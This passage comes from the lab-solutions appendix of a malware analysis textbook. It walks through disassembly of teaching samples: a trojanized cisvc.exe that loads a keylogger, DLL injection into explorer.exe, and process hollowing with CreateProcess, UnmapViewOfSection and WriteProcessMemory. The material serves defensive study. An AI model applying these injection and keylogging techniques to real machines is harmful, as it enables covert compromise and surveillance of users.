    top part of Figure 11-7L shows the original *cisvc.exe* (named *cisvc_original.exe*)
    loaded into PEview, and the bottom part shows the trojanized *cisvc.exe*. At 
    and , we see that the entry point differs in the two binaries. If we load both
    binaries into IDA Pro, we see that the malware has performed entry-point redirection
    so that the shellcode runs before the original entry point any time that *cisvc.exe*
    is launched. Listing 11-19L shows a snippet of the shellcode in the trojanized
    version of *cisvc.exe*.'
  prefs: []
  type: TYPE_NORMAL
- en: 01001B0A call dword ptr [ebp-4] 
  prefs: []
  type: TYPE_NORMAL
- en: 01001B0D mov [ebp-10h], eax
  prefs: []
  type: TYPE_NORMAL
- en: 01001B10 lea eax, [ebx+24h]
  prefs: []
  type: TYPE_NORMAL
- en: 01001B16 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 01001B17 mov eax, [ebp-10h]
  prefs: []
  type: TYPE_NORMAL
- en: 01001B1A push eax
  prefs: []
  type: TYPE_NORMAL
- en: '**584**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 01001B1B call dword ptr [ebp-0Ch] 
  prefs: []
  type: TYPE_NORMAL
- en: 01001B1E mov [ebp-8], eax
  prefs: []
  type: TYPE_NORMAL
- en: 01001B21 call dword ptr [ebp-8] 
  prefs: []
  type: TYPE_NORMAL
- en: 01001B24 mov esp, ebp
  prefs: []
  type: TYPE_NORMAL
- en: 01001B26 pop ebp
  prefs: []
  type: TYPE_NORMAL
- en: 01001B27 jmp _wmainCRTStartup 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-19L: Important calls within the shellcode inside the trojanized*
    cisvc.exe Now we load the trojanized version of *cisvc.exe* into a debugger and
    set a breakpoint at 0x1001B0A. We find that at , the malware calls LoadLibrary
    to load *inet_epar32.dll* into memory. At , the malware calls GetProcAddress
    with the argument zzz69806582 to get the address of the exported function.'
  prefs: []
  type: TYPE_NORMAL
- en: At , the malware calls zzz69806582\. Finally, the malware jumps to the original
    entry point at , so that the service can run as it would normally. The shellcode’s
    function matches our earlier suspicion that it loads *inet_epar32.dll* and calls
    its export.
  prefs: []
  type: TYPE_NORMAL
- en: '**Keylogger Analysis**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we analyze *inet_epar32.dll*, which is the same as *Lab11-03.dll*. We
    load *Lab11-03.dll* into IDA Pro and begin to analyze the file. The majority of
    the **1 1**
  prefs: []
  type: TYPE_NORMAL
- en: code stems from the zzz69806582 export. This export starts a thread and returns,
    so we will focus on analyzing the thread, as shown in Listing 11-20L.
  prefs: []
  type: TYPE_NORMAL
- en: 1000149D push offset Name ; "MZ"
  prefs: []
  type: TYPE_NORMAL
- en: 100014A2 push 1 ; bInitialOwner 100014A4 push 0 ; lpMutexAttributes 100014A6
    call ds:CreateMutexA 
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 100014BD push 0 ; hTemplateFile 100014BF push 80h ; dwFlagsAndAttributes 100014C4
    push 4 ; dwCreationDisposition 100014C6 push 0 ; lpSecurityAttributes 100014C8
    push 1 ; dwShareMode 100014CA push 0C0000000h ; dwDesiredAccess 100014CF push
    offset FileName ; "C:\\WINDOWS\\System32\\ kernel64x.dll"
  prefs: []
  type: TYPE_NORMAL
- en: 100014D4 call ds:CreateFileA 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-20L: Mutex and file creation performed by the thread created by
    zzz69806582*'
  prefs: []
  type: TYPE_NORMAL
- en: At , the malware creates a mutex named MZ. This mutex prevents the malware
    from running more than one instance of itself, since a previous call to OpenMutex
    (not shown) will terminate the thread if the mutex MZ already exists. Next, at
    , the malware opens or creates a file named *kernel64x.dll* for writing.
  prefs: []
  type: TYPE_NORMAL
- en: After getting a handle to *kernel64x.dll*, the malware sets the file pointer
    to the end of the file and calls sub_10001380, which contains a loop. This loop
    contains calls to GetAsyncKeyState, GetForegroundWindow, and WriteFile. This is
    consistent with the keylogging method we discussed in “User-Space Keyloggers”
    on page 239\.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**585**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Summary**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Lab11-03.exe* trojanizes and then starts the Windows indexing service ( *cisvc.exe*).'
  prefs: []
  type: TYPE_NORMAL
- en: The trojan shellcode loads a DLL and calls an exported function that launches
    a keylogger. The export creates the mutex MZ and logs all keystrokes to *kernel64x.dll*
    in the Windows system directory.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 12-1 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: After you run the malware, pop-up messages are displayed on the screen every
    minute.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The process being injected is *explorer.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: You can restart the *explorer.exe* process.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The malware performs DLL injection to launch *Lab12-01.dll* within *explorer.exe*.
    Once *Lab12-01.dll* is injected, it displays a message box on the screen every
    minute with a counter that shows how many minutes have elapsed.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Let’s begin with basic static analysis. Examining the imports for *Lab12-01.exe*,
    we see CreateRemoteThread, WriteProcessMemory, and VirtualAllocEx. Based on the
    discussion in Chapter 12, we know that we are probably dealing with some form
    of process injection. Therefore, our first goal should be to determine the code
    that is being injected and into which process. Examining the strings in the malware,
    we see some notable ones, including explorer.exe, Lab12-01.dll, and psapi.dll.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we use basic dynamic techniques to see what the malware does when it runs.
    When we run the malware, it creates a message box every minute (quite annoying
    when you are trying to use analysis tools). Procmon doesn’t have any useful information,
    Process Explorer shows no obvious process running, and no network functions appear
    to be imported, so we shift to IDA Pro to determine what is producing the message
    boxes.
  prefs: []
  type: TYPE_NORMAL
- en: A few lines from the start of the main function, we see the malware resolving
    functions for Windows process enumeration within *psapi.dll*. Listing 12-1L
  prefs: []
  type: TYPE_NORMAL
- en: contains one example of the three functions the malware manually resolves using
    LoadLibraryA and GetProcAddress.
  prefs: []
  type: TYPE_NORMAL
- en: 0040111F push offset ProcName ; "EnumProcessModules"
  prefs: []
  type: TYPE_NORMAL
- en: 00401124 push offset LibFileName ; "psapi.dll"
  prefs: []
  type: TYPE_NORMAL
- en: 00401129 call ds:**LoadLibraryA**
  prefs: []
  type: TYPE_NORMAL
- en: 0040112F push eax ; hModule 00401130 call ds:**GetProcAddress**
  prefs: []
  type: TYPE_NORMAL
- en: 00401136 mov
  prefs: []
  type: TYPE_NORMAL
- en: dword_408714, eax
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-1L: Dynamically resolving process enumeration imports* **586**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: The malware saves the function pointers to dword_408714, dword_40870C, and dword_408710\.
    We can change these global variables to more easily identify the function being
    called later in our analysis by renaming them myEnumProcessModules, myGetModuleBaseNameA,
    and myEnumProcesses. In Listing 12-1L, we should rename dword_408714 to myEnumProcessModules
    at .
  prefs: []
  type: TYPE_NORMAL
- en: After the dynamic resolution of the functions, the code calls dword_408710
  prefs: []
  type: TYPE_NORMAL
- en: (EnumProcesses), which retrieves a PID for each process object in the system.
  prefs: []
  type: TYPE_NORMAL
- en: EnumProcesses returns an array of the PIDs referenced by the local variable
    dwProcessId. dwProcessId is used in a loop to iterate through the process list
    and call sub_401000 for each PID.
  prefs: []
  type: TYPE_NORMAL
- en: When we examine sub_401000, we see that the dynamically resolved import EnumProcessModules
    is called after OpenProcess for the PID passed to the function. Next, we see a
    call to dword_40870C (GetModuleBaseNameA) at , as shown in Listing 12-2L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401078 push 104h
  prefs: []
  type: TYPE_NORMAL
- en: 0040107D lea ecx, [ebp+Str1]
  prefs: []
  type: TYPE_NORMAL
- en: 00401083 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00401084 mov edx, [ebp+var_10C]
  prefs: []
  type: TYPE_NORMAL
- en: 0040108A push edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040108B mov eax, [ebp+hObject]
  prefs: []
  type: TYPE_NORMAL
- en: 0040108E push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040108F call dword_40870C  ; GetModuleBaseNameA 00401095 push 0Ch ; MaxCount
    **1 2**
  prefs: []
  type: TYPE_NORMAL
- en: 00401097 push offset Str2 ; "explorer.exe"
  prefs: []
  type: TYPE_NORMAL
- en: 0040109C lea ecx, [ebp+Str1]
  prefs: []
  type: TYPE_NORMAL
- en: 004010A2 push ecx ; Str1
  prefs: []
  type: TYPE_NORMAL
- en: 004010A3 call _strnicmp 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-2L: Strings compared against* explorer.exe'
  prefs: []
  type: TYPE_NORMAL
- en: The dynamically resolved function GetModuleBaseNameA is used to translate from
    the PID to the process name. After this call, we see a comparison at 
  prefs: []
  type: TYPE_NORMAL
- en: between the strings obtained with GetModuleBaseNameA (Str1) and explorer.exe
    (Str2). The malware is looking for the *explorer.exe* process in memory.
  prefs: []
  type: TYPE_NORMAL
- en: Once *explorer.exe* is found, the function at sub_401000 will return 1, and
    the main function will call OpenProcess to open a handle to it. If the malware
    obtains a handle to the process successfully, the code in Listing 12-3L will execute,
    and the handle hProcess will be used to manipulate the process.
  prefs: []
  type: TYPE_NORMAL
- en: 0040128C push 4 ; flProtect 0040128E push 3000h ; flAllocationType 00401293
    push 104h  ;
  prefs: []
  type: TYPE_NORMAL
- en: dwSize
  prefs: []
  type: TYPE_NORMAL
- en: 00401298 push 0 ; lpAddress 0040129A mov edx, [ebp+**hProcess**]
  prefs: []
  type: TYPE_NORMAL
- en: 004012A0 push edx ; hProcess 004012A1 call ds:**VirtualAllocEx** 
  prefs: []
  type: TYPE_NORMAL
- en: 004012A7 mov [ebp+**lpParameter**], eax 
  prefs: []
  type: TYPE_NORMAL
- en: 004012AD cmp [ebp+lpParameter], 0
  prefs: []
  type: TYPE_NORMAL
- en: 004012B4 jnz short loc_4012BE
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**587**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004012BE push 0 ; lpNumberOfBytesWritten 004012C0 push 104h ; nSize 004012C5
    lea eax, [ebp+**Buffer**]
  prefs: []
  type: TYPE_NORMAL
- en: 004012CB push eax ; lpBuffer 004012CC mov ecx, [ebp+**lpParameter**]
  prefs: []
  type: TYPE_NORMAL
- en: 004012D2 push ecx ; lpBaseAddress 004012D3 mov edx, [ebp+**hProcess**]
  prefs: []
  type: TYPE_NORMAL
- en: 004012D9 push edx ; hProcess 004012DA call ds:**WriteProcessMemory** 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-3L: Writing a string to a remote process*'
  prefs: []
  type: TYPE_NORMAL
- en: 'In Listing 12-3L, we see a call to VirtualAllocEx at . This dynamically allocates
    memory in the *explorer.exe* process: 0x104 bytes are allocated by pushing dwSize
    at . If VirtualAllocEx is successful, a pointer to the allocated memory will
    be moved into lpParameter at , to be passed with the process handle to WriteProcessMemory
    at , in order to write data to *explorer.exe*. The data written to the process
    is referenced by the Buffer parameter in bold.'
  prefs: []
  type: TYPE_NORMAL
- en: In order to understand what is injected, we trace the code back to where Buffer
    is set. We find it set to the path of the current directory appended with Lab12-01.dll.
    We can now conclude that this malware writes the path of *Lab12-01.dll* into the
    *explorer.exe* process.
  prefs: []
  type: TYPE_NORMAL
- en: If the malware successfully writes the path of the DLL into *explorer.exe*,
    the code in Listing 12-4L will execute.
  prefs: []
  type: TYPE_NORMAL
- en: 004012E0 push offset ModuleName ; "kernel32.dll"
  prefs: []
  type: TYPE_NORMAL
- en: 004012E5 call ds:**GetModuleHandleA**
  prefs: []
  type: TYPE_NORMAL
- en: 004012EB mov [ebp+hModule], eax
  prefs: []
  type: TYPE_NORMAL
- en: 004012F1 push offset aLoadlibrarya ; "LoadLibraryA"
  prefs: []
  type: TYPE_NORMAL
- en: 004012F6 mov eax, [ebp+hModule]
  prefs: []
  type: TYPE_NORMAL
- en: 004012FC push eax ; hModule 004012FD call ds:**GetProcAddress**
  prefs: []
  type: TYPE_NORMAL
- en: 00401303 mov [ebp+lpStartAddress], eax 
  prefs: []
  type: TYPE_NORMAL
- en: 00401309 push 0 ; lpThreadId 0040130B push 0 ; dwCreationFlags 0040130D mov
    ecx, [ebp+lpParameter]
  prefs: []
  type: TYPE_NORMAL
- en: 00401313 push ecx ; lpParameter 00401314 mov edx, [ebp+lpStartAddress]
  prefs: []
  type: TYPE_NORMAL
- en: 0040131A push edx  ;
  prefs: []
  type: TYPE_NORMAL
- en: lpStartAddress
  prefs: []
  type: TYPE_NORMAL
- en: 0040131B push 0 ; dwStackSize 0040131D push 0 ; lpThreadAttributes 0040131F
    mov eax, [ebp+**hProcess**]
  prefs: []
  type: TYPE_NORMAL
- en: 00401325 push eax ; hProcess 00401326 call ds:CreateRemoteThread
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-4L: Creating the remote thread*'
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 12-4L, the calls to GetModuleHandleA and GetProcAddress (in bold)
    will be used to get the address to LoadLibraryA. The address of LoadLibraryA will
    be the same in *explorer.exe* as it is in the malware ( *Lab12-01.exe*) with the
    address of LoadLibraryA inserted into lpStartAddress shown at . lpStartAddress
    is provided to CreateRemoteThread at  in order to force *explorer.exe* to call
    LoadLibraryA.
  prefs: []
  type: TYPE_NORMAL
- en: '**588**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 131](index-622_1.png)'
  prefs: []
  type: TYPE_IMG
- en: The parameter for LoadLibraryA is passed via CreateRemoteThread in lpParameter,
    the string containing the path to *Lab12-01.dll*. This, in turn, starts a thread
    in the remote process that calls LoadLibraryA with the parameter of Lab12-01.dll.
  prefs: []
  type: TYPE_NORMAL
- en: We can now conclude that this malware executable performs DLL injection of *Lab12-01.dll*
    into *explorer.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: Now that we know where and what is being injected, we can try to stop those
    annoying pop-ups, launching Process Explorer to help us out. As shown in Figure
    12-1L, we select *explorer.exe* in the process listing, and then choose **View****Show
    Lower Pane** and **View****Lower Pane View****DLLs**.
  prefs: []
  type: TYPE_NORMAL
- en: Scrolling through the resulting window, we see *Lab12-01.dll* listed as being
    loaded into *explorer.exe*’s memory space. Using Process Explorer is an easy way
    to spot DLL injection and useful in confirming our IDA Pro analysis. To stop the
    pop-ups, we can use Process Explorer to kill *explorer.exe*, and then restart
    it by selecting **File****Run** and entering **explorer**.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 2**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 12-1L: Process Explorer view showing injected DLL*'
  prefs: []
  type: TYPE_NORMAL
- en: Having analyzed *Lab12-01.exe*, we move on to *Lab12-01.dll* to see if it does
    something in addition to creating message boxes. When we analyze *Lab12-01.dll*
    with IDA Pro, we see that it does little more than create a thread that then creates
    another thread. The code in Listing 12-5L is from the first thread, a loop that
    creates a thread every minute (0xEA60 milliseconds).
  prefs: []
  type: TYPE_NORMAL
- en: 10001046 mov ecx, [ebp+var_18]
  prefs: []
  type: TYPE_NORMAL
- en: 10001049 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 1000104A push offset Format ; "Practical Malware Analysis %d"
  prefs: []
  type: TYPE_NORMAL
- en: 1000104F lea edx, [ebp+Parameter]
  prefs: []
  type: TYPE_NORMAL
- en: 10001052 push edx ; Dest
  prefs: []
  type: TYPE_NORMAL
- en: 10001053 call _sprintf 
  prefs: []
  type: TYPE_NORMAL
- en: 10001058 add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 1000105B push 0 ; lpThreadId 1000105D push 0 ; dwCreationFlags 1000105F lea
    eax, [ebp+Parameter]
  prefs: []
  type: TYPE_NORMAL
- en: 10001062 push eax ; lpParameter 10001063 push offset **StartAddress**  ;
  prefs: []
  type: TYPE_NORMAL
- en: lpStartAddress
  prefs: []
  type: TYPE_NORMAL
- en: 10001068 push 0 ; dwStackSize 1000106A push 0 ; lpThreadAttributes 1000106C
    call ds:**CreateThread**
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**589**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 10001072 push 0EA60h ; dwMilliseconds 10001077 call ds:**Sleep**
  prefs: []
  type: TYPE_NORMAL
- en: 1000107D mov ecx, [ebp+**var_18**]
  prefs: []
  type: TYPE_NORMAL
- en: 10001080 add ecx, 1 
  prefs: []
  type: TYPE_NORMAL
- en: 10001083 mov [ebp+var_18], ecx
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-5L: Analyzing the thread created by* Lab12-01.dll'
  prefs: []
  type: TYPE_NORMAL
- en: The new thread at , labeled StartAddress by IDA Pro, creates the message box
    that says “Press OK to reboot,” and takes a parameter for the title of the box
    that is set by the sprintf at . This parameter is the format string
  prefs: []
  type: TYPE_NORMAL
- en: '"Practical Malware Analysis %d", where %d is replaced with a counter stored
    in var_18 that increments at . We conclude that this DLL does nothing other than
    produce annoying message boxes that increment by one every minute.'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 12-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The purpose of this program is to covertly launch another program.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The program uses process replacement to hide execution.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The malicious payload is stored in the program’s resource section. The resource
    has type UNICODE and the name LOCALIZATION.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The malicious payload stored in the program’s resource section is XOR-encoded.
    This decode routine can be found at sub_40132C. The XOR byte is found at 0x0040141B.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The strings are XOR-encoded using the function at sub_401000\.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: Since we’ve already analyzed this binary in the labs for Chapter 3, let’s begin
    by opening the file with IDA Pro and looking at the function imports. Many functions
    in the list provide little information because they are commonly imported by all
    Windows executables, but a few stand out. Specifically, CreateProcessA, GetThreadContext,
    and SetThreadContext indicate that this program creates new processes and is modifying
    the execution context of processes. The imports ReadProcessMemory and WriteProcessMemory
    tell us that the program is reading and writing directly to process memory spaces.
    The imports LockResource and SizeOfResource tell us where data important to the
    process may be stored. We’ll focus first on the purpose of the CreateProcessA
    function call found at location 0x0040115F, as shown in Listing 12-6L.
  prefs: []
  type: TYPE_NORMAL
- en: 00401145 lea edx, [ebp+ProcessInformation]
  prefs: []
  type: TYPE_NORMAL
- en: 00401148 push edx  ; lpProcessInformation 00401149 lea eax, [ebp+StartupInfo]
  prefs: []
  type: TYPE_NORMAL
- en: 0040114C push eax ; lpStartupInfo 0040114D push 0 ; lpCurrentDirectory 0040114F
    push 0 ; lpEnvironment 00401151 push 4  ;
  prefs: []
  type: TYPE_NORMAL
- en: dwCreationFlags
  prefs: []
  type: TYPE_NORMAL
- en: '**590**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 132](index-624_1.png)'
  prefs: []
  type: TYPE_IMG
- en: 00401153 push 0 ; bInheritHandles 00401155 push 0 ; lpThreadAttributes 00401157
    push 0 ; lpProcessAttributes 00401159 push 0 ; lpCommandLine 0040115B mov ecx,
    [ebp+lpApplicationName]
  prefs: []
  type: TYPE_NORMAL
- en: 0040115E push ecx ; lpApplicationName 0040115F call ds:**CreateProcessA**
  prefs: []
  type: TYPE_NORMAL
- en: '...'
  prefs: []
  type: TYPE_NORMAL
- en: 00401191 mov ecx, [ebp+ProcessInformation.hThread]
  prefs: []
  type: TYPE_NORMAL
- en: 00401194 push ecx ; hThread 00401195 call ds:GetThreadContext 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-6L: Creating a suspended process and accessing the main thread’s
    context* At  in Listing 12-6L, we see a push 4, which IDA Pro labels as the parameter
    dwCreationFlags. The MSDN documentation for CreateProcess tells us that this is
    the CREATE_SUSPENDED flag, which allows the process to be created but not started.
    The process will not execute until the main process thread is started via the
    ResumeThread API.'
  prefs: []
  type: TYPE_NORMAL
- en: At , we see the program accessing the context of a thread. The hThread parameter
    for GetThreadContext comes from the same buffer passed to CreateProcessA at ,
    which tells us that the program is accessing the context of the suspended thread.
    Obtaining the thread handle is important because the program will use the thread
    handle to interact with the suspended process.
  prefs: []
  type: TYPE_NORMAL
- en: '**1 2**'
  prefs: []
  type: TYPE_NORMAL
- en: After the call to GetThreadContext, we see the context used in a call to ReadProcessMemory.
    To better determine what the program is doing with the context, we need to add
    the CONTEXT structure in IDA Pro. To add this standard structure, click the **Structures**
    tab and press the INS key. Next, click the **Add Standard Structure** button and
    locate the structure named CONTEXT.
  prefs: []
  type: TYPE_NORMAL
- en: Once you’ve added the structure, right-click location 0x004011C3 to allow the
    resolution of the structure offset, as shown in Figure 12-2L. As you can see,
    the offset 0xA4 actually references the EBX register of the thread by the [eax+CONTEXT._Ebx].
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 12-2L: IDA Pro structure offset resolution*'
  prefs: []
  type: TYPE_NORMAL
- en: The EBX register of a suspended newly created process always contains a pointer
    to the Process Environment Block (PEB) data structure. As shown in Listing 12-7L,
    at , the program increments the PEB data structure by 8 bytes and pushes the
    value onto the stack as the start address for the memory read.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**591**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004011B8 push 0 ; lpNumberOfBytesRead 004011BA push 4  ;
  prefs: []
  type: TYPE_NORMAL
- en: nSize
  prefs: []
  type: TYPE_NORMAL
- en: 004011BC lea edx, [ebp+Buffer]
  prefs: []
  type: TYPE_NORMAL
- en: 004011BF push edx ; lpBuffer 004011C0 mov eax, [ebp+lpContext]
  prefs: []
  type: TYPE_NORMAL
- en: 004011C3 mov ecx, [eax+CONTEXT._Ebx]
  prefs: []
  type: TYPE_NORMAL
- en: 004011C9 add ecx, 8 
  prefs: []
  type: TYPE_NORMAL
- en: 004011CC push ecx ; lpBaseAddress 004011CD mov edx, [ebp+ProcessInformation.hProcess]
  prefs: []
  type: TYPE_NORMAL
- en: 004011D0 push edx ; hProcess 004011D1 call ds:**ReadProcessMemory**
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-7L: Reading a PEB data structure*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Because the PEB data structure is not part of the standard IDA Pro data structures,
    we can use an Internet search or WinDbg to help determine what is at offset 8
    of the PEB data structure: a pointer to the ImageBaseAddress or the start of the
    loaded executable. Passing this address as the read location and reading 4 bytes
    at , we see that what IDA Pro has labeled Buffer will contain the ImageBase of
    the suspended process.'
  prefs: []
  type: TYPE_NORMAL
- en: The program manually resolves the import UnMapViewOfSection using GetProcAddress
    at 0x004011E8, and at 0x004011FE, the ImageBaseAddress is a parameter of UnMapViewOfSection.
    The call to UnMapViewOfSection removes the suspended process from memory, at which
    point the program can no longer execute.
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 12-8L, we see the parameters pushed onto the stack for a call to
    VirtualAllocEx.
  prefs: []
  type: TYPE_NORMAL
- en: 00401209 push 40h ; flProtect 0040120B push 3000h ; flAllocationType 00401210
    mov edx, [ebp+var_8]
  prefs: []
  type: TYPE_NORMAL
- en: 00401213 mov eax, [edx+50h]
  prefs: []
  type: TYPE_NORMAL
- en: 00401216 push eax ; dwSize 00401217 mov ecx, [ebp+var_8]
  prefs: []
  type: TYPE_NORMAL
- en: 0040121A mov edx, [ecx+34h]
  prefs: []
  type: TYPE_NORMAL
- en: 0040121D push edx ; lpAddress 0040121E mov eax, [ebp+ProcessInformation.hProcess]
  prefs: []
  type: TYPE_NORMAL
- en: 00401221 push eax ; hProcess 00401222 call ds:VirtualAllocEx
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-8L: Allocating memory for an executable within a suspended process*
    Notice that this listing shows the program allocating memory within the suspended
    processes address space, at . This is behavior that requires further investigation.'
  prefs: []
  type: TYPE_NORMAL
- en: At the beginning of the function, the program checks for the MZ magic value
    at 0x004010FE and a PE magic value at 0x00401119\. If the checks are valid, we
    know that var_8 contains a pointer to the PE header loaded in memory.
  prefs: []
  type: TYPE_NORMAL
- en: At , the program requests that the memory be allocated at the address of the
    ImageBase of the buffer-based PE file, which tells the Windows loader **592**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: where the executable would prefer to be loaded into memory. At , the program
    requests the size of memory specified by the PE header value ImageSize (offset
    0x50). Finally, at , we use the MSDN documentation to determine that the memory
    is being allocated with PAGE_EXECUTE_READWRITE permissions.
  prefs: []
  type: TYPE_NORMAL
- en: Once the memory has been allocated, a WriteProcessMemory at 0x00401251
  prefs: []
  type: TYPE_NORMAL
- en: writes data from the beginning of the PE file into the memory just allocated
    within the suspended process. The number of bytes written is taken from offset
    0x54 of the PE header, SizeOfHeaders. This first WriteProcessMemory copies the
    PE file headers into the suspended process, which suggests that this program is
    moving a PE file into another process’s address space.
  prefs: []
  type: TYPE_NORMAL
- en: Next, in Listing 12-9L, we see a loop at  where the loop counter var_70
  prefs: []
  type: TYPE_NORMAL
- en: is initialized to 0 at 0x00401257\.
  prefs: []
  type: TYPE_NORMAL
- en: 00401257 mov
  prefs: []
  type: TYPE_NORMAL
- en: '[ebp+var_70],'
  prefs: []
  type: TYPE_NORMAL
- en: '0'
  prefs: []
  type: TYPE_NORMAL
- en: 0040125E jmp
  prefs: []
  type: TYPE_NORMAL
- en: short
  prefs: []
  type: TYPE_NORMAL
- en: loc_401269
  prefs: []
  type: TYPE_NORMAL
- en: '00401260 loc_401260:'
  prefs: []
  type: TYPE_NORMAL
- en: '; CODE XREF: sub_4010EA+1CD_j'
  prefs: []
  type: TYPE_NORMAL
- en: 00401260 mov eax, [ebp+var_70]
  prefs: []
  type: TYPE_NORMAL
- en: 00401263 add eax, 1
  prefs: []
  type: TYPE_NORMAL
- en: 00401266 mov [ebp+var_70], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401269
  prefs: []
  type: TYPE_NORMAL
- en: '00401269 loc_401269: ; CODE XREF: sub_4010EA+174_j 00401269 mov ecx, [ebp+var_8]'
  prefs: []
  type: TYPE_NORMAL
- en: 0040126C xor edx, edx
  prefs: []
  type: TYPE_NORMAL
- en: 0040126E mov dx, [ecx+6]
  prefs: []
  type: TYPE_NORMAL
- en: '**1 2**'
  prefs: []
  type: TYPE_NORMAL
- en: 00401272 cmp [ebp+var_70], edx 
  prefs: []
  type: TYPE_NORMAL
- en: 00401275 jge short loc_4012B9
  prefs: []
  type: TYPE_NORMAL
- en: 00401277 mov eax, [ebp+var_4]
  prefs: []
  type: TYPE_NORMAL
- en: 0040127A mov ecx, [ebp+lpBuffer]
  prefs: []
  type: TYPE_NORMAL
- en: 0040127D add ecx, [eax+3Ch] 
  prefs: []
  type: TYPE_NORMAL
- en: 00401280 mov edx, [ebp+var_70]
  prefs: []
  type: TYPE_NORMAL
- en: 00401283 imul edx, 28h 
  prefs: []
  type: TYPE_NORMAL
- en: 00401286 lea eax, [ecx+edx+0F8h]
  prefs: []
  type: TYPE_NORMAL
- en: 0040128D mov [ebp+var_74], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401290 push 0 ; lpNumberOfBytesWritten 00401292 mov ecx, [ebp+var_74]
  prefs: []
  type: TYPE_NORMAL
- en: 00401295 mov edx, [ecx+10h]
  prefs: []
  type: TYPE_NORMAL
- en: 00401298 push edx ; nSize 00401299 mov eax, [ebp+var_74]
  prefs: []
  type: TYPE_NORMAL
- en: 0040129C mov ecx, [ebp+lpBuffer]
  prefs: []
  type: TYPE_NORMAL
